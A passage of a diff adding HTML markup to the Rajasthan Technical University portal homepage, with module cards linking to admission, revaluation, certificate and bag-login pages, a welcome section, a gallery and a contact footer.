+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Online/Revaluation/LoginExam_Reval.aspx">
+                                                                            <img class="co11" src="img/Revaluation-UTD.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="Online/Revaluation/LoginExam_Reval.aspx">Revaluation-UTD</a>
+                                                                        <a class="m-texts" href="Online/Revaluation/LoginExam_Reval.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Dispatch/BarcodeAndScanning/Reevaluation_View_Copy.aspx">
+                                                                            <img class="co13" src="img/View_Copy_Of_Revaluation.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="Dispatch/BarcodeAndScanning/Reevaluation_View_Copy.aspx">View Copy Of Revaluation</a>
+                                                                        <a class="m-texts" href="Dispatch/BarcodeAndScanning/Reevaluation_View_Copy.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Online/Bulk_ExamForm/Billdesk_QueryAPI/Billdesk_Payment_Verification_OpentoAll.aspx">
+                                                                            <img class="co26" src="img/collegee.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <a class="m-headingss" href="Online/Bulk_ExamForm/Billdesk_QueryAPI/Billdesk_Payment_Verification_OpentoAll.aspx">Payment Verification</a>
+                                                                    <a class="m-texts" href="Online/Bulk_ExamForm/Billdesk_QueryAPI/Billdesk_Payment_Verification_OpentoAll.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+                                            
+
+                                            
+                                            
+                                        </div>
+
+                                    </fieldset>
+
+                                    <fieldset class="fieldset-border">
+                                        <legend>Admission</legend>
+                                        <div class="row">
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="CollegePortal/Student_Admission_Process/AdmReg_Login.aspx">
+                                                                            <img class="co5" src="img/Admission-Registration-Login.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="CollegePortal/Student_Admission_Process/AdmReg_Login.aspx">Admission Registration & Login </a>
+                                                                        <a class="m-texts" href="CollegePortal/Student_Admission_Process/AdmReg_Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="CollegePortal/Student_Direct_Admission/AdmReg_Login.aspx">
+                                                                            <img class="co6" src="img/Admission-Registration-Login.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="CollegePortal/Student_Direct_Admission/AdmReg_Login.aspx">Direct Admission Registration B.Tech/BCA/BBA/MBA </a>
+                                                                        <a class="m-texts" href="CollegePortal/Student_Direct_Admission/AdmReg_Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="https://rtupreadmission.sumsraj.com/Login.aspx">
+                                                                            <img class="co7" src="img/Admission-Registration-Login.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="https://rtupreadmission.sumsraj.com/Login.aspx">Direct Admission Registration M.Tech </a>
+                                                                        <a class="m-texts" href="https://rtupreadmission.sumsraj.com/Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Online/Acd_Convocation_data.aspx">
+                                                                            <img class="co26" src="img/Revaluation-UTD.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <a class="m-headingss" href="Online/Acd_Convocation_data.aspx">Convocation Data Verification</a>
+                                                                    <a class="m-texts" href="Online/Acd_Convocation_data.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="CollegePortal/Constituent_Direct_Admission/ApplicantLogin.aspx">
+                                                                            <img class="co6" src="img/Admission-Registration-Login.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="CollegePortal/Constituent_Direct_Admission/ApplicantLogin.aspx">Constituent Direct Admission Registration B.Tech/BCA/BBA/MBA </a>
+                                                                        <a class="m-texts" href="CollegePortal/Constituent_Direct_Admission/ApplicantLogin.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                        </div>
+                                    </fieldset>
+
+                                    <fieldset class="fieldset-border">
+                                        <legend>Certificate</legend>
+                                        <div class="row">
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="DocumentRequest/Doc_TCCC_Request_LoginPage.aspx">
+                                                                            <img class="co12" src="img/Apply_Certificate_For_UD_(TCCCBonafide).webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="DocumentRequest/Doc_TCCC_Request_LoginPage.aspx">Apply Certificate For UD (TC/CC/Bonafide)</a>
+                                                                        <a class="m-texts" href="DocumentRequest/Doc_TCCC_Request_LoginPage.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="DC_Request/DC_Login.aspx">
+                                                                            <img class="co14" src="img/DC_Demo.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <div class="modulename">
+                                                                        <a class="m-headingss" href="DC_Request/DC_Login.aspx">Application for Marksheet/ Certificate/ Verification</a>
+                                                                        <a class="m-texts" href="DC_Request/DC_Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                    </div>
+                                                                </td>
+                                                                
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="CollegePortal/Certificates/ApplyEducationLoanCertificate.aspx">
+                                                                            <img class="co26" src="img/collegee.webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <a class="m-headingss" href="CollegePortal/Certificates/ApplyEducationLoanCertificate.aspx">Apply Education Loan Expenses Certificate</a>
+                                                                    <a class="m-texts" href="CollegePortal/Certificates/ApplyEducationLoanCertificate.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                            <div class="col-sm-2-5">
+                                                <div class="module_icon_main_div card-home">
+                                                    <table width="100%">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td>
+                                                                    <div class="moduleimages">
+                                                                        <a href="Online/Acd_Convocation_data.aspx">
+                                                                            <img class="co26" src="img/Apply_Certificate_For_UD_(TCCCBonafide).webp">
+                                                                        </a>
+                                                                    </div>
+                                                                </td>
+                                                                <td>
+                                                                    <a class="m-headingss" href="CollegePortal/SACP/SACP_Login.aspx">Apply Academic Certificate</a>
+                                                                    <a class="m-texts" href="CollegePortal/SACP/SACP_Login.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </td>
+
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                                <div class="bottom-box"></div>
+                                            </div>
+
+                                        </div>
+                                    </fieldset>
+
+                                </div>
+                                <!----Student Corner end------>
+
+                                <!----Bag Login start------>
+                                <div class="tab-pane fade custom-fade" id="tab4default">
+
+                                    <div class="row">
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="CollegePortal/LoginBag.aspx">
+                                                                        <img class="co1" src="img/bag-login.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="CollegePortal/LoginBag.aspx">Bag Login (Theory Evaluation Marks) </a>
+                                                                    <a class="m-texts" href="CollegePortal/LoginBag.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="CollegePortal/LoginBag_Reval.aspx">
+                                                                        <img class="co2" src="img/bag-login.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="CollegePortal/LoginBag_Reval.aspx">Bag Login (Revaluation Marks)</a>
+                                                                    <a class="m-texts" href="CollegePortal/LoginBag_Reval.asp">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                                <!----Bag Login end------>
+
+                                <!----Notice board start------>
+                                <div class="tab-pane fade custom-fade" id="tab5default">
+
+                                    <div class="row">
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Monitoring/Examination/Activity_Monitoring.aspx">
+                                                                        <img class="co1" src="img/notice_board.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Monitoring/Examination/Activity_Monitoring.aspx">Notice Board </a>
+                                                                    <a class="m-texts" href="Monitoring/Examination/Activity_Monitoring.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                                <!----Notice board end------>
+
+                                <!----Others start------>
+                                <div class="tab-pane fade custom-fade" id="tab6default">
+
+                                    <div class="row">
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Online/ACD_ExamFormOpen_Mst.aspx">
+                                                                        <img class="co1" src="img/exam-form-start-end-date.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Online/ACD_ExamFormOpen_Mst.aspx">Examination Form Start & Close Date  </a>
+                                                                    <a class="m-texts" href="Online/ACD_ExamFormOpen_Mst.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="http://123.253.160.124:7676/rtu/index.php?r=user%2Fauth%2Flogin">
+                                                                        <img class="co1" src="img/knowledge-management.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="http://123.253.160.124:7676/rtu/index.php?r=user%2Fauth%2Flogin  ">Knowledge Management  </a>
+                                                                    <a class="m-texts" href="http://123.253.160.124:7676/rtu/index.php?r=user%2Fauth%2Flogin  ">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="https://rtuoffice.sumsraj.com/alumni/alm_default.aspx">
+                                                                        <img class="co1" src="img/alumni.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="https://rtuoffice.sumsraj.com/alumni/alm_default.aspx">Alumni  </a>
+                                                                    <a class="m-texts" href="https://rtuoffice.sumsraj.com/alumni/alm_default.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+
+                                        <div class="col-sm-2-5">
+                                            <div class="module_icon_main_div card-home">
+                                                <table width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <div class="moduleimages">
+                                                                    <a href="Examsys/Examsys_NewExaminerRegistration.aspx">
+                                                                        <img class="co1" src="img/paperSetterImg.webp">
+                                                                    </a>
+                                                                </div>
+                                                            </td>
+                                                            <td>
+                                                                <div class="modulename">
+                                                                    <a class="m-headingss" href="Examsys/Examsys_NewExaminerRegistration.aspx">Paper Setter Registration  </a>
+                                                                    <a class="m-texts" href="Examsys/Examsys_NewExaminerRegistration.aspx">Click to View <i class="fa fa-angle-right" aria-hidden="true"></i></a>
+                                                                </div>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                            <div class="bottom-box"></div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                                <!----Others end------>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!----module design end------>
+
+                <section>
+                    <div class="cover-image sptb bg-background-colors text-white">
+                        <div class="content-text mb-0">
+                            <div class="container">
+                                <div class="section-title center-block text-center">
+                                    <h2>Welcome to Rajasthan Technical University</h2>
+
+                                    <p class="text-white-50">University currently affiliates about 68 Engineering Colleges, 03 B.Arch, 16 MCA Colleges, 39 MBA Colleges, 31 M.Tech Colleges, 01 M.Arch and 01 Hotel Management and Catering Institute</p>
+                                </div>
+                                <div class="row">
+                                    <div class="col-lg-6">
+                                        <div class="row">
+                                            <div class="col-md-12">
+                                                <div class="widgets-cards mb-5">
+                                                    <div class="d-flex">
+                                                        <div class="widgets-cards-icons">
+                                                            <div class="wrp counter-icon1 mr-5">
+                                                                <i class="fa fa-home"></i>
+                                                            </div>
+                                                        </div>
+                                                        <div class="widgets-cards-data">
+                                                            <div class="text-wrapper">
+                                                                <h4><a href="#" class="text-white fs-25">Rajasthan Technical University</a></h4>
+                                                                <p class="text-white mt-2 mb-0">RTU was established in 2006 by the Government of Rajasthan to enhance the technical education in the state.</p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-12">
+                                                <div class="widgets-cards mb-5">
+                                                    <div class="d-flex">
+                                                        <div class="widgets-cards-icons">
+                                                            <div class="wrp counter-icon1 mr-5">
+                                                                <i class="fa fa-eye"></i>
+                                                            </div>
+                                                        </div>
+                                                        <div class="widgets-cards-data">
+                                                            <div class="text-wrapper">
+                                                                <h4><a href="#" class="text-white fs-25">Our Vision</a></h4>
+                                                                <p class="text-white mt-2 mb-0">
+                                                                    To achieve academic excellence in Engineering by imparting in depth knowledge to the students,facilitating research activities and
+cater to the ever changing industrial demands, global and societal needs.
+                                                                </p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-md-12">
+                                                <div class="widgets-cards">
+                                                    <div class="d-flex">
+                                                        <div class="widgets-cards-icons">
+                                                            <div class="wrp counter-icon1 mr-5">
+                                                                <i class="fa fa-book"></i>
+                                                            </div>
+                                                        </div>
+                                                        <div class="widgets-cards-data">
+                                                            <div class="text-wrapper">
+                                                                <h4><a href="#" class="text-white fs-25">Our Mission</a></h4>
+                                                                <p class="text-white mt-2 mb-0">
+                                                                    To provide quality engineering education to the students.<br />
+                                                                    To offer state of arts education in engineering.<br />
+                                                                    To establish industry institute interaction to make students ready for the industrial environment.<br />
+                                                                    To promote research based projects/activities to develop department as Center of Excellence for Research. 
+                                                                </p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-lg-6 mrt-sm-2">
+                                        <div class="clients-img ">
+                                            <img src="img/ab.webp" style="width: 100%;" alt="img" class="bg-white br-3 p-1">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+
+
+                <div class="container-fluid">
+                    <div class="row no-gutter">
+                        <section class="gallery">
+                            <div class="invoice-header text-center">
+                                <h1 class="wecome-title">Gallery</h1>
+                            </div>
+
+                            <div class="slider">
+                                <img src="img/1.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/2.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/3.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/4.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/5.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/6.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/7.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                                <img src="img/8.webp" class="img-responsive" style="width: 100%; height: 250px;" />
+                            </div>
+
+                        </section>
+
+
+                    </div>
+
+
+                </div>
+
+                <!-- Footer Start -->
+                <footer id="rs-footer" class="bg3 rs-footer">
+                    <!-- Footer Top -->
+
+                    <div class="footer-top pt-45">
+                        <div class="container-fluid">
+                            <div class="row">
+                                <div class="col-lg-3 col-md-12">
+                                    <h5 class="footer-title">Quick Links</h5>
+                                    <ul class="sitemap-widget">
+                                        <li><a href="#" data-toggle="modal" data-target="#important-links">Important Links</a></li>
+                                        <li><a href="#" data-toggle="modal" data-target="#news">News & Events</a></li>
+                                        <li><a href="#" data-toggle="modal" data-target="#notification">Instructions & Notifications</a></li>
+                                        <li><a href="Loginpage.aspx">University Login</a></li>
+                                    </ul>
+                                </div>
+                                <div class="col-lg-3 col-md-12">
+                                    <h5 class="footer-title">Contact</h5>
+                                    <ul class="sitemap-widget">
+                                        <li>Rajasthan Technical University, Rawatbhata Road,<br>
+                                            Kota - 324010
+                                        </li>
+                                        <li><a href="Tel:0744-2473931"><span class="white-text">Controller of Examination(Conduct): 0744-2473931</span></a></li>
+                                        <li><a href="Tel:0744-2473861"><span class="white-text">Controller of Examination(Secy.): 0744-2473861</span></a></li>
+                                        <li><a href="Tel:0744-2473015"><span class="white-text">Dean(Academic): 0744-2473015</span></a></li>
+                                        <li><a href="Tel:0744-2473062"><span class="white-text">Recruitment Cell: 0744-2473062</span></a></li>
+                                    </ul>
+                                </div>
+                                <div class="col-lg-6 col-md-12">
+                                    <h5 class="footer-title">Location</h5>
+                                    <ul class="sitemap-widget">
+                                        <li>
+                                            <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d14447.687345142844!2d75.8076301!3d25.1383333!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x396f835fcc2a9e43%3A0x69e74069e551d77d!2sRajasthan%20Technical%20University%2C%20Kota!5e0!3m2!1sen!2sin!4v1728044117697!5m2!1sen!2sin" width="100%" height="200" style="border: 0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <!-- <div class="col-lg-3 col-md-12">
+                                          <h5 class="footer-title">Other Links</h5>
+                                          <ul class="sitemap-widget">
+                                              <li class="active"><a href="#"><i class="fa fa-angle-right" aria-hidden="true"></i> Copyright Policy</a></li>
+                                              <li ><a href="#"><i class="fa fa-angle-right" aria-hidden="true"></i> Privacy Policy</a></li>
+                                              <li><a href="#"><i class="fa fa-angle-right" aria-hidden="true"></i> Hyperlink Policy</a></li>
+                                              <li><a href="#"><i class="fa fa-angle-right" aria-hidden="true"></i>Terms and Conditions</a></li>
+                                              <li><a href="#"><i class="fa fa-angle-right" aria-hidden="true"></i>Help</a></li>
+                                          </ul>
+                                      </div> -->
+                            </div>
+                        </div>
+                    </div>
+                    <div class="footer-bottom">
+                        <div class="container-fluid">
+                            <div class="copyright">
+                                <!-- <p>Last Updated: August 25, 2023</p> -->
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+
+
+                <div class="wrapper" style="display: none;">
+
+
+                    
+
+
+
+                    <div class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
+
+                        <fieldset class="fieldset-border">
+                            <legend><i class="fa fa-user" aria-hidden="true"></i>Student Corner</legend>
+
+                            <div class="modules">
+
+
+                                
+
+                                <div id="dynamicMenu"><div class='row'><div class='col-md-2'><div class='services-two__single co9'><div class='services-two__icon col9'><span class='icon-coding'><i class='fa fa-file-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Monitoring/Examination/Activity_Monitoring.aspx'> NOTICE BOARD</a></h3><div class='services-two__btn-box'><a href = 'Monitoring/Examination/Activity_Monitoring.aspx' class='thm-btn services-two__btn co-9'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co1'><div class='services-two__icon col1'><span class='icon-coding'><i class='fa fa-university' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Loginpage.aspx'> College Login</a></h3><div class='services-two__btn-box'><a href = 'Loginpage.aspx' class='thm-btn services-two__btn co-1'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co9'><div class='services-two__icon col9'><span class='icon-coding'><i class='fa fa-file-text-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Exam/Report/DownloadGradesheet.aspx'> Download RESULT</a></h3><div class='services-two__btn-box'><a href = 'Exam/Report/DownloadGradesheet.aspx' class='thm-btn services-two__btn co-9'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co3'><div class='services-two__icon col3'><span class='icon-coding'><i class='fa fa-file-text-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Exam/Exam_Material/Download_AdmitCard.aspx'> Download admit Card</a></h3><div class='services-two__btn-box'><a href = 'Exam/Exam_Material/Download_AdmitCard.aspx' class='thm-btn services-two__btn co-3'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co9'><div class='services-two__icon col9'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'https://rtustudentportal.sumsraj.com/'> UTD Exam Form Login</a></h3><div class='services-two__btn-box'><a href = 'https://rtustudentportal.sumsraj.com/' class='thm-btn services-two__btn co-9'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co7'><div class='services-two__icon col7'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'https://rtustudentportal.sumsraj.com/'> Student Portal</a></h3><div class='services-two__btn-box'><a href = 'https://rtustudentportal.sumsraj.com/' class='thm-btn services-two__btn co-7'>view</a></div></div></div></div><div class='row'><div class='col-md-2'><div class='services-two__single co8'><div class='services-two__icon col8'><span class='icon-coding'><i class='fa fa-university' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'LoginAff.aspx'> Affiliation</a></h3><div class='services-two__btn-box'><a href = 'LoginAff.aspx' class='thm-btn services-two__btn co-8'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co2'><div class='services-two__icon col2'><span class='icon-coding'><i class='fa fa-calendar' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Online/ACD_ExamFormOpen_Mst.aspx'> Examination Form Start & Close Date</a></h3><div class='services-two__btn-box'><a href = 'Online/ACD_ExamFormOpen_Mst.aspx' class='thm-btn services-two__btn co-2'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co10'><div class='services-two__icon col10'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/Student_Admission_Process/AdmReg_Login.aspx'> Admission Registration & Login</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/Student_Admission_Process/AdmReg_Login.aspx' class='thm-btn services-two__btn co-10'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co8'><div class='services-two__icon col8'><span class='icon-coding'><i class='fa fa-building-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'HMS/HMS_PayLogin.aspx'> Apply For Hostel First Year</a></h3><div class='services-two__btn-box'><a href = 'HMS/HMS_PayLogin.aspx' class='thm-btn services-two__btn co-8'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co1'><div class='services-two__icon col1'><span class='icon-coding'><i class='fa fa-user-plus' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/Student_Direct_Admission/AdmReg_Login.aspx'> Direct Admission Registration B.Tech/BBA/MBA</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/Student_Direct_Admission/AdmReg_Login.aspx' class='thm-btn services-two__btn co-1'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co2'><div class='services-two__icon col2'><span class='icon-coding'><i class='fa fa-user-plus' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'https://rtupreadmission.sumsraj.com/Login.aspx'> Direct Admission Registration M.Tech</a></h3><div class='services-two__btn-box'><a href = 'https://rtupreadmission.sumsraj.com/Login.aspx' class='thm-btn services-two__btn co-2'>view</a></div></div></div></div><div class='col-md-2'><div class='services-two__single co9'><div class='services-two__icon col9'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/LoginBag.aspx'> Bag Login (Theory Evaluation Marks)</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/LoginBag.aspx' class='thm-btn services-two__btn co-9'>view</a></div></div></div><div class='row'><div 